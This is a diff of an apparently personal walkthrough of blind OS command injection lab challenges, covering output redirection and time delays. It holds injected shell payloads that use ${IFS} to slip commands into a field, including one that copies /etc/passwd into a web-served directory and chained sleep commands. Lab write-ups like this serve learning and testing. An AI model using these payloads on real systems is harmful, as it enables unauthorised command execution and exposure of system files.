@@ -94,6 +94,7 @@ Challenge description: Blind OS command injection with output redirection
 - Use this linux command to redirect whoami output to a file in /var/www/images
 
         ;touch${IFS}/var/www/images/resullt.txt;whoami${IFS}>${IFS}/var/www/images/result.txt
+        ;cat${IFS}/etc/passwd>/var/www/images/result.txt
 
   ![2023-10-24_16-57](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/a0a1c81c-e08b-49cb-98cb-516778b9b206)
 
@@ -110,5 +111,23 @@ Challenge description: Blind OS command injection with output redirection
   ![2023-10-24_17-29](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/a8ab9448-fbcb-4f90-99da-3ccfd8ad231d)
 
         
+### Last Challenge
+Challenge Description: Blind OS command injection with time delays
+
+ ![2023-10-24_17-38](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/7a38ed0f-12b1-4489-a7c8-72b419c31662)
+
+- The goal of this challenge is to initiate a 10 seconds time delay.You can achieve it with bash 'sleep' function
+
+       sleep 10
+- I used the payload to initiate time delays
+
+      ;sleep${IFS}20;sleep${IFS}10;sleep${IFS}10;sleep${IFS}10;sleep${IFS}10
+
+   ![2023-10-24_17-50](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/0449e534-5ff5-43f9-a63b-0972d8157c1c)
+
+- Challenge solved
+
+   ![2023-10-24_17-53](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/184d6931-a629-4d4d-aa58-51748d5ed3e7)
+
   
 
